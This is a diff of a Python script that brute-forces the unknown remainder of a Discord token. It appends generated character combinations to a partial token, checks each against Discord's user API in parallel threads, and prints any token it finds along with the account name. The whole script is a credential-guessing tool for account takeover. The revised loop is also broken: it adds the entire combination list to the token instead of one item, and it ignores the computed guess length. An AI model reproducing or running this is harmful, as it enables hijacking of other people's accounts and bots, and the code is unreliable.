@@ -1,5 +1,5 @@
 import concurrent.futures
-import random
+import string
 import sys
 import urllib
 from json import loads
@@ -7,37 +7,31 @@ from urllib.request import Request
 
 from tqdm import tqdm
 
-HOWLONGATOKENIS = 59
-CurrentToken = input("Enter your token: ")
-guessLength = HOWLONGATOKENIS - len(CurrentToken)
-possibleChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890._"
-totalCombos = len(possibleChars) ** guessLength
-print("Total possible combinations: " + str(totalCombos))
-input("Press enter to continue...")
+
+# Constants
+TOKEN_LENGTH = 59
+TOKEN_PATTERN = "/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/"
+TOKEN_CHARS = string.ascii_letters + string.digits + "_"
 
 
-# generate combination from iteration number
-def generateCombos(guessLength, iteration):
-    combos = []
-    for i in range(guessLength):
-        combos.append(possibleChars[iteration % len(possibleChars)])
-        iteration = iteration // len(possibleChars)
-    return "".join(combos)
-
-
-possibleChars = list(possibleChars)
-random.shuffle(possibleChars)
-possibleChars = "".join(possibleChars)
+inputToken = ""
+if not inputToken:
+    inputToken = input("Enter your token: ")
+guessLength = TOKEN_LENGTH - len(inputToken)
+combos = [i + j for i in TOKEN_CHARS for j in TOKEN_CHARS]
+c = len(combos)
 
 
 def validateToken(token, bot=True):
     if bot:
         token = "Bot " + token
-    req = Request("https://discord.com/api/v9/users/@me", headers={
-        "Authorization": token,
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
-        # beware cloudflare
-    })
+    req = Request(
+        "https://discord.com/api/v9/users/@me", 
+        headers={
+            "Authorization": token,
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
+        }
+    )
     try:
         response = urllib.request.urlopen(req)
         # json to dict
@@ -53,28 +47,22 @@ def validateToken(token, bot=True):
     return None
 
 
-def main():
+if __name__ == '__main__':
     futures = []
     executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)  # beware cloudflare
-    for i in range(totalCombos):
-        combos = generateCombos(guessLength, i)
-        combos = CurrentToken + combos
-        futures.append(executor.submit(validateToken, combos))
+    for combo in combos:
+        testToken = inputToken + combos
+        futures.append(executor.submit(validateToken, testToken))
 
-    with tqdm(total=totalCombos) as pbar:
+    with tqdm(total=c) as pbar:
         for future in concurrent.futures.as_completed(futures):
             try:
                 data = future.result()
                 if data:
                     print(f'Found token: {data["token"]}, {data["username"]}#{data["discriminator"]}')
-                    pbar.update(totalCombos - pbar.n)
+                    pbar.update(c - pbar.n)
                     pbar.close()
                     sys.exit(0)
-
             except:
                 pass
             pbar.update(1)
-
-
-if __name__ == '__main__':
-    main()
